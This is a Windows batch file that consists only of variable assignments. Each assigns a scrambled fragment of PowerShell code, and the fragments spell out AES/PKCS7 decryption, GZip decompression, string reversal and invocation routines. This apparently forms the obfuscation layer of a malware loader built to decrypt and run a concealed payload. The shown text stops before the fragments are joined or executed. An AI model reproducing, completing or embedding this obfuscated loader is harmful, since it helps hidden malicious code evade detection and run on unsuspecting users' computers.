@echo off
set "YdGvyvKZcc=F.En"
set "UDrZJGywfU=EBM."
set "plwMOsxbOr=$uBU"
set "wVMEJWaawG=Stre"
set "bGxaCmGRgq=w) {"
set "GFGcmePHbP=  $p"
set "mafCKoWdQv=Y = "
set "vzpNHmgLur=;$EX"
set "vIOLxHwWMK= [Sy"
set "PHigSfQRFw=stem"
set "rBAikYZTDE=pres"
set "yVzjQKSaNB=.IO."
set "IwVJQlQFCY= = ["
set "clMEHSpraU='dqR"
set "gRdTpPYJda=S46e"
set "YOeRKqDdTV=sion"
set "iUnmJgPcZf=[Sys"
set "MGOeWkxEyx=yste"
set "EAVmtdyVjo=urit"
set "RdhyLKtAtT=();$"
set "tqjzicqXNI=ach "
set "wLImtTMwIJ=v4Ir"
set "TpTwqjjHPZ=k; }"
set "xQtQfTipyc=BUqJ"
set "WOWYoLDGBA=ect "
set "cSwLjVjVkK=vert"
set "LmiDLjfSZR=daeR"
set "hcCgWWCZrU=brea"
set "xoHuVYMaZR=rofi"
set "ICCMqWIldd=stem"
set "ZBIxYkDfRM=:('g"
set "zICAtOOsUT=Ykyt"
set "dGenuPBJxU=ewLi"
set "iHYWkCQFBF=grap"
set "atZLKCmPhH=Hl);"
set "zOtvzvogbN=);$N"
set "NtjCkKlSoe=n ''"
set "UjeYBnIhxq=tem."
set "VQxYcILvdb=tem."
set "JjhaigydbE=Syst"
set "YCyMjPcbiz=BUqJ"
set "PLKKRMrVVg=::De"
set "tjdAzIlJbn=esFX"
set "zEmRLciTJg=pose"
set "SdDjUEgNUN=$CIL"
set "VhKrsSmbGN=ZVu "
set "zCPgDfqObD=gnir"
set "YTIXnesOyR=IVur"
set "egslMUUJzS=g = "
set "usVsfisETd=ode]"
set "pkpoLehgTI=ddin"
set "APpcoAUClv=raph"
set "NWSbkPMVdZ=oin "
set "dzPnLAHndT=yste"
set "tyPLkcjXGp=y.Ci"
set "EcEpkAgpUV=form"
set "peLadqzbqk=PKCS"
set "KDmnNrZmcZ='txe"
set "tNCBfSYdKn=lit("
set "NSCPZnEjyb=[]] "
set "dvkCPLZtzq=F'[-"
set "AubLVuYcCV=;$St"
set "pMKOMCBfiS=ing("
set "VwiGeLLRYg=ring"
set "eCNLMhzAYg== $u"
set "WNphJUcuJz=.Cry"
set "ETlbhDqzLI=RYky"
set "MoLNVJUskK=)) {"
set "wGOYLMXSQa=('%*'"
set "ByjvfKigWT=aJ.T"
set "nXxlyHDiCB=tion"
set "EhBIMTvOgZ=..-1"
set "IZucwlZodR=lBlo"
set "TMMXBhqhXy=y.Cr"
set "lCQUAVZNiq=-Obj"
set "bBPRXXNCnv=th('"
set "HaOVCIQRXh=em.I"
set "yvSzPRCIhU=);$H"
set "rpKokYUYSO=raph"
set "fMTizJBlzU=rity"
set "EXHHsmjERP=$RYk"
set "mejrUljZnk=;$KO"
set "ZzioflMSOl=e]::"
set "spfDJhZYpJ=yt);"
set "ZyEJtSauni=Obje"
set "uETUaDmQBv=ert]"
set "LqEypbvQMu=mory"
set "QtaleMHicR=gth)"
set "pHWtISOyTQ=oArr"
set "OVEvcvZMzj=pose"
set "zLenGNPcWn= = $"
set "UxewhUZDoi=ecry"
set "xrvpDATVtV=$EXE"
set "nEfcvpbaGk=isfL"
set "cFWcMRWlpA=-4] "
set "DmtZGBxtPt=ionM"
set "gFqdFWmtmt=ose("
set "AIJYwyUppJ=).Sp"
set "nOFkmRysuA=ress"
set "DQhvtuqRNh=qJ.I"
set "IkwMbNcPXG=, (,"
set "wmmiGMJOyj=Hl.T"
set "UzCvoNFVCo=.Len"
set "lGLycjxPRo=Hl ="
set "IPkICKAPnP=m.Re"
set "YxHRBpXadf=ispo"
set "soAXesRhqm=.Cry"
set "QoGZeboQOl=DaJ."
set "cLRVIfjfHT=stem"
set "chuRMcJRBC=RYky"
set "rgzCqLXYma=1..-"
set "JxWPLmcQHp=)))"
set "kezFdrFZNX=Secu"
set "mavOcaPHps=se()"
set "TIcmYILwuQ=comp"
set "AMFzhpXfYZ= New"
set "oFYfHQeUmg=-joi"
set "dYyTIEHiWw=..-1"
set "WvOPSyUTkF=ck($"
set "ntrgSpXDqx=DaJ "
set "HxDMcfVVRV=rans"
set "wdSTVFqDLO=3); "
set "QYTKzhxOhi=[-1."
set "nWtPNjxYbf=();$"
set "iktdGGscoy=fore"
set "sprHtFAzLl=.Key"
set "xLQbqWdEzX=7Yiv"
set "MAZBmMGZRo=Syst"
set "fCJYpTAbMD=)($p"
set "kPQADJYmBc== [S"
set "mOrxUbuolF=.Com"
set "gMJHdCjour=+hAO"
set "lTcQZiiRpn=.-16"
set "UyRVempFSZ= [st"
set "SMilHQgqWd=t = "
set "GwKbYYkhJN= = $"
set "tGlsjplzYL=();$"
set "CvbqMpxjmP=.Mod"
set "KpQGkZfFJB=]::("
set "ARldZqpslC=, $R"
set "gYyNhIMOgA=e = "
set "aBOnZgkvDL=yt ="
set "aprjKLBxqA=:: '"
set "udaTuYHqZO=ateD"
set "uZuGdRAaIv=BUqJ"
set "EcJIglBfDt=m(, "
set "HCVAigyhkb='')("
set "PZuvNlXSiT=V = "
set "LPkEBZHkio=New-"
set "VfvbrjbNHJ=Comp"
set "dvsCPuIoWF=TPZV"
set "BjmbkZgWrV=join"
set "yZmTgxKANE=eam("
set "QupBMfUJhc=rity"
set "yPgpfFchLt=Obje"
set "DaseMyhTjo=ose("
set "nPacwCQoDC=;$NX"
set "ZBXjjkccRb=orF'"
set "VeoyIPfRCu=rtS4"
set "WSTPRSWjJp=[Sys"
set "OWVkhUwCLm=EXEB"
set "RBLZzyHpAc= = N"
set "MuSMqbEqZA=trea"
set "QnShgxYbXc=]::("
set "YxamFjZneH=ct S"
set "jmFLkIIvfv=);$C"
set "BSLFKxuDJy=.Mem"
set "EHENmOXNUb=Comp"
set "nywTJiRIDZ= [Sy"
set "OOvwsMarWK=nirt"
set "pRUbAljRfo=TllA"
set "pOFUPWrylq=Disp"
set "GnVsaTOlMy=hy.A"
set "nxTQSdwbjg=em.C"
set "WNnoqsIIxh=qY.D"
set "oYnjiUFpAy=;$St"
set "dfnGknPJab=$Hzt"
set "ahVRiLQonE=ddin"
set "FAioGJyfwp=.Sec"
set "PpqZlbJNxq= if "
set "LdkkYSuFRB=ion."
set "RXSKnfFXEw=m.IO"
set "JCbfWRqFKw=$StD"
set "NdMNyuJKns=vj0m"
set "dmLoQtgGBB=yste"
set "dkVjQlJJIF=16] "
set "MMdwheZNtu=XFTJ"
set "iZTlMsSmpG=OyzA"
set "UvQoIGczJb=New-"
set "zTQwwGcxWf==');"
set "uEYFcasMjh=uBUq"
set "lMmiIevHjs=ptog"
set "BzNlfQHrxH=Invo"
set "qlJPpqRbYC=Conv"
set "gdoAFkjqOD=$CIL"
set "nsmzMQdsjF=fiF "
set "EMVxsBNAXq=RYky"
set "QGATyFMGpC=BM, "
set "cRHFOphssJ=.GZi"
set "wWjdriNwvB=.Cop"
set "ipvdxBMbgd=);$u"
set "qJVLIvBHyu=Secu"
set "cMoZGEadZu=ay()"
set "pElTekorZl=iron"
